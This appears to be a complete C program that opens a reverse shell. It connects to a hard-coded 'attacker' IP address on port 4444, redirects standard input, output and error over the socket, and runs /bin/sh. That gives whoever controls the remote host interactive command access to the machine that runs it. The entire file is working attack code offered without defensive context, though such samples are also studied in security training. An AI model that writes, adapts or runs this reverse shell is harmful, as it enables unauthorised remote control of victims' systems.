#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main()
{
    // IP address of the attacker
    const char *attacker_ip = "192.168.1.111"; // Changed from "mememe" to valid IP

    // Structure for IP address of the target system
    struct sockaddr_in target_address;
    target_address.sin_family = AF_INET;
    target_address.sin_port = htons(4444);

    // Convert IP address
    if (inet_aton(attacker_ip, &target_address.sin_addr) == 0)
    {
        perror("inet_aton failed");
        exit(1);
    }

    // System call to create a socket
    int socket_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_file_descriptor == -1)
    {
        perror("socket failed");
        exit(1);
    }

    // System call to establish a connection
    if (connect(socket_file_descriptor, (struct sockaddr *)&target_address,
                sizeof(target_address)) == -1)
    {
        perror("connect failed");
        close(socket_file_descriptor);
        exit(1);
    }

    // Duplicate file descriptors for stdin, stdout, stderr- Input and output go over the network
    for (int index = 0; index < 3; index++)
    {
        if (dup2(socket_file_descriptor, index) == -1)
        {
            perror("dup2 failed");
            close(socket_file_descriptor);
            exit(1);
        }
    }

    // System call to execute shell
    execve("/bin/sh", NULL, NULL);

    // If execve fails
    perror("execve failed");
    close(socket_file_descriptor);
    return 1;
}